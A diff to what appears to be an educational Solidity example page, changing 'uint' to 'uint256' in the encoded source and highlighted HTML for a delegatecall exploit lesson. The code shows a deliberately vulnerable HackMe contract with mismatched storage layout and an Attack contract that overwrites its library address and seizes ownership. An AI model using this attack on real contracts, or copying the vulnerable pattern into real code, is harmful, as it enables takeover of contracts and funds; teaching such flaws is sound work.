@@ -12,7 +12,7 @@ export const codes = [
   },
   {
     fileName: "Delegatecall_2.sol",
-    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCi8qClRoaXMgaXMgYSBtb3JlIHNvcGhpc3RpY2F0ZWQgdmVyc2lvbiBvZiB0aGUgcHJldmlvdXMgZXhwbG9pdC4KCjEuIEFsaWNlIGRlcGxveXMgTGliIGFuZCBIYWNrTWUgd2l0aCB0aGUgYWRkcmVzcyBvZiBMaWIKMi4gRXZlIGRlcGxveXMgQXR0YWNrIHdpdGggdGhlIGFkZHJlc3Mgb2YgSGFja01lCjMuIEV2ZSBjYWxscyBBdHRhY2suYXR0YWNrKCkKNC4gQXR0YWNrIGlzIG5vdyB0aGUgb3duZXIgb2YgSGFja01lCgpXaGF0IGhhcHBlbmVkPwpOb3RpY2UgdGhhdCB0aGUgc3RhdGUgdmFyaWFibGVzIGFyZSBub3QgZGVmaW5lZCBpbiB0aGUgc2FtZSBtYW5uZXIgaW4gTGliCmFuZCBIYWNrTWUuIFRoaXMgbWVhbnMgdGhhdCBjYWxsaW5nIExpYi5kb1NvbWV0aGluZygpIHdpbGwgY2hhbmdlIHRoZSBmaXJzdApzdGF0ZSB2YXJpYWJsZSBpbnNpZGUgSGFja01lLCB3aGljaCBoYXBwZW5zIHRvIGJlIHRoZSBhZGRyZXNzIG9mIGxpYi4KCkluc2lkZSBhdHRhY2soKSwgdGhlIGZpcnN0IGNhbGwgdG8gZG9Tb21ldGhpbmcoKSBjaGFuZ2VzIHRoZSBhZGRyZXNzIG9mIGxpYgpzdG9yZSBpbiBIYWNrTWUuIEFkZHJlc3Mgb2YgbGliIGlzIG5vdyBzZXQgdG8gQXR0YWNrLgpUaGUgc2Vjb25kIGNhbGwgdG8gZG9Tb21ldGhpbmcoKSBjYWxscyBBdHRhY2suZG9Tb21ldGhpbmcoKSBhbmQgaGVyZSB3ZQpjaGFuZ2UgdGhlIG93bmVyLgoqLwoKY29udHJhY3QgTGliIHsKICAgIHVpbnQgcHVibGljIHNvbWVOdW1iZXI7CgogICAgZnVuY3Rpb24gZG9Tb21ldGhpbmcodWludCBfbnVtKSBwdWJsaWMgewogICAgICAgIHNvbWVOdW1iZXIgPSBfbnVtOwogICAgfQp9Cgpjb250cmFjdCBIYWNrTWUgewogICAgYWRkcmVzcyBwdWJsaWMgbGliOwogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CiAgICB1aW50IHB1YmxpYyBzb21lTnVtYmVyOwoKICAgIGNvbnN0cnVjdG9yKGFkZHJlc3MgX2xpYikgewogICAgICAgIGxpYiA9IF9saWI7CiAgICAgICAgb3duZXIgPSBtc2cuc2VuZGVyOwogICAgfQoKICAgIGZ1bmN0aW9uIGRvU29tZXRoaW5nKHVpbnQgX251bSkgcHVibGljIHsKICAgICAgICBsaWIuZGVsZWdhdGVjYWxsKGFiaS5lbmNvZGVXaXRoU2lnbmF0dXJlKCJkb1NvbWV0aGluZyh1aW50MjU2KSIsIF9udW0pKTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIC8vIE1ha2Ugc3VyZSB0aGUgc3RvcmFnZSBsYXlvdXQgaXMgdGhlIHNhbWUgYXMgSGFja01lCiAgICAvLyBUaGlzIHdpbGwgYWxsb3cgdXMgdG8gY29ycmVjdGx5IHVwZGF0ZSB0aGUgc3RhdGUgdmFyaWFibGVzCiAgICBhZGRyZXNzIHB1YmxpYyBsaWI7CiAgICBhZGRyZXNzIHB1YmxpYyBvd25lcjsKICAgIHVpbnQgcHVibGljIHNvbWVOdW1iZXI7CgogICAgSGFja01lIHB1YmxpYyBoYWNrTWU7CgogICAgY29uc3RydWN0b3IoSGFja01lIF9oYWNrTWUpIHsKICAgICAgICBoYWNrTWUgPSBIYWNrTWUoX2hhY2tNZSk7CiAgICB9CgogICAgZnVuY3Rpb24gYXR0YWNrKCkgcHVibGljIHsKICAgICAgICAvLyBvdmVycmlkZSBhZGRyZXNzIG9mIGxpYgogICAgICAgIGhhY2tNZS5kb1NvbWV0aGluZyh1aW50KHVpbnQxNjAoYWRkcmVzcyh0aGlzKSkpKTsKICAgICAgICAvLyBwYXNzIGFueSBudW1iZXIgYXMgaW5wdXQsIHRoZSBmdW5jdGlvbiBkb1NvbWV0aGluZygpIGJlbG93IHdpbGwKICAgICAgICAvLyBiZSBjYWxsZWQKICAgICAgICBoYWNrTWUuZG9Tb21ldGhpbmcoMSk7CiAgICB9CgogICAgLy8gZnVuY3Rpb24gc2lnbmF0dXJlIG11c3QgbWF0Y2ggSGFja01lLmRvU29tZXRoaW5nKCkKICAgIGZ1bmN0aW9uIGRvU29tZXRoaW5nKHVpbnQgX251bSkgcHVibGljIHsKICAgICAgICBvd25lciA9IG1zZy5zZW5kZXI7CiAgICB9Cn0K",
+    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCi8qClRoaXMgaXMgYSBtb3JlIHNvcGhpc3RpY2F0ZWQgdmVyc2lvbiBvZiB0aGUgcHJldmlvdXMgZXhwbG9pdC4KCjEuIEFsaWNlIGRlcGxveXMgTGliIGFuZCBIYWNrTWUgd2l0aCB0aGUgYWRkcmVzcyBvZiBMaWIKMi4gRXZlIGRlcGxveXMgQXR0YWNrIHdpdGggdGhlIGFkZHJlc3Mgb2YgSGFja01lCjMuIEV2ZSBjYWxscyBBdHRhY2suYXR0YWNrKCkKNC4gQXR0YWNrIGlzIG5vdyB0aGUgb3duZXIgb2YgSGFja01lCgpXaGF0IGhhcHBlbmVkPwpOb3RpY2UgdGhhdCB0aGUgc3RhdGUgdmFyaWFibGVzIGFyZSBub3QgZGVmaW5lZCBpbiB0aGUgc2FtZSBtYW5uZXIgaW4gTGliCmFuZCBIYWNrTWUuIFRoaXMgbWVhbnMgdGhhdCBjYWxsaW5nIExpYi5kb1NvbWV0aGluZygpIHdpbGwgY2hhbmdlIHRoZSBmaXJzdApzdGF0ZSB2YXJpYWJsZSBpbnNpZGUgSGFja01lLCB3aGljaCBoYXBwZW5zIHRvIGJlIHRoZSBhZGRyZXNzIG9mIGxpYi4KCkluc2lkZSBhdHRhY2soKSwgdGhlIGZpcnN0IGNhbGwgdG8gZG9Tb21ldGhpbmcoKSBjaGFuZ2VzIHRoZSBhZGRyZXNzIG9mIGxpYgpzdG9yZSBpbiBIYWNrTWUuIEFkZHJlc3Mgb2YgbGliIGlzIG5vdyBzZXQgdG8gQXR0YWNrLgpUaGUgc2Vjb25kIGNhbGwgdG8gZG9Tb21ldGhpbmcoKSBjYWxscyBBdHRhY2suZG9Tb21ldGhpbmcoKSBhbmQgaGVyZSB3ZQpjaGFuZ2UgdGhlIG93bmVyLgoqLwoKY29udHJhY3QgTGliIHsKICAgIHVpbnQyNTYgcHVibGljIHNvbWVOdW1iZXI7CgogICAgZnVuY3Rpb24gZG9Tb21ldGhpbmcodWludDI1NiBfbnVtKSBwdWJsaWMgewogICAgICAgIHNvbWVOdW1iZXIgPSBfbnVtOwogICAgfQp9Cgpjb250cmFjdCBIYWNrTWUgewogICAgYWRkcmVzcyBwdWJsaWMgbGliOwogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CiAgICB1aW50MjU2IHB1YmxpYyBzb21lTnVtYmVyOwoKICAgIGNvbnN0cnVjdG9yKGFkZHJlc3MgX2xpYikgewogICAgICAgIGxpYiA9IF9saWI7CiAgICAgICAgb3duZXIgPSBtc2cuc2VuZGVyOwogICAgfQoKICAgIGZ1bmN0aW9uIGRvU29tZXRoaW5nKHVpbnQyNTYgX251bSkgcHVibGljIHsKICAgICAgICBsaWIuZGVsZWdhdGVjYWxsKGFiaS5lbmNvZGVXaXRoU2lnbmF0dXJlKCJkb1NvbWV0aGluZyh1aW50MjU2KSIsIF9udW0pKTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIC8vIE1ha2Ugc3VyZSB0aGUgc3RvcmFnZSBsYXlvdXQgaXMgdGhlIHNhbWUgYXMgSGFja01lCiAgICAvLyBUaGlzIHdpbGwgYWxsb3cgdXMgdG8gY29ycmVjdGx5IHVwZGF0ZSB0aGUgc3RhdGUgdmFyaWFibGVzCiAgICBhZGRyZXNzIHB1YmxpYyBsaWI7CiAgICBhZGRyZXNzIHB1YmxpYyBvd25lcjsKICAgIHVpbnQyNTYgcHVibGljIHNvbWVOdW1iZXI7CgogICAgSGFja01lIHB1YmxpYyBoYWNrTWU7CgogICAgY29uc3RydWN0b3IoSGFja01lIF9oYWNrTWUpIHsKICAgICAgICBoYWNrTWUgPSBIYWNrTWUoX2hhY2tNZSk7CiAgICB9CgogICAgZnVuY3Rpb24gYXR0YWNrKCkgcHVibGljIHsKICAgICAgICAvLyBvdmVycmlkZSBhZGRyZXNzIG9mIGxpYgogICAgICAgIGhhY2tNZS5kb1NvbWV0aGluZyh1aW50MjU2KHVpbnQxNjAoYWRkcmVzcyh0aGlzKSkpKTsKICAgICAgICAvLyBwYXNzIGFueSBudW1iZXIgYXMgaW5wdXQsIHRoZSBmdW5jdGlvbiBkb1NvbWV0aGluZygpIGJlbG93IHdpbGwKICAgICAgICAvLyBiZSBjYWxsZWQKICAgICAgICBoYWNrTWUuZG9Tb21ldGhpbmcoMSk7CiAgICB9CgogICAgLy8gZnVuY3Rpb24gc2lnbmF0dXJlIG11c3QgbWF0Y2ggSGFja01lLmRvU29tZXRoaW5nKCkKICAgIGZ1bmN0aW9uIGRvU29tZXRoaW5nKHVpbnQyNTYgX251bSkgcHVibGljIHsKICAgICAgICBvd25lciA9IG1zZy5zZW5kZXI7CiAgICB9Cn0K",
   },
 ]
 
@@ -110,9 +110,9 @@ change the owner.
 */</span>
 
 <span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Lib</span> </span>{
-    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> someNumber;
+    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> someNumber;
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
         someNumber <span class="hljs-operator">=</span> _num;
     }
 }
@@ -120,14 +120,14 @@ change the owner.
 <span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HackMe</span> </span>{
     <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> lib;
     <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
-    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> someNumber;
+    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> someNumber;
 
     <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _lib</span>) </span>{
         lib <span class="hljs-operator">=</span> _lib;
         owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
     }
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
         lib.<span class="hljs-built_in">delegatecall</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"doSomething(uint256)"</span>, _num));
     }
 }
@@ -137,7 +137,7 @@ change the owner.
     <span class="hljs-comment">// This will allow us to correctly update the state variables</span>
     <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> lib;
     <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
-    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> someNumber;
+    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> someNumber;
 
     HackMe <span class="hljs-keyword">public</span> hackMe;
 
@@ -147,14 +147,14 @@ change the owner.
 
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
         <span class="hljs-comment">// override address of lib</span>
-        hackMe.doSomething(<span class="hljs-keyword">uint</span>(<span class="hljs-keyword">uint160</span>(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))));
+        hackMe.doSomething(<span class="hljs-keyword">uint256</span>(<span class="hljs-keyword">uint160</span>(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))));
         <span class="hljs-comment">// pass any number as input, the function doSomething() below will</span>
         <span class="hljs-comment">// be called</span>
         hackMe.doSomething(<span class="hljs-number">1</span>);
     }
 
     <span class="hljs-comment">// function signature must match HackMe.doSomething()</span>
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
         owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
     }
 }
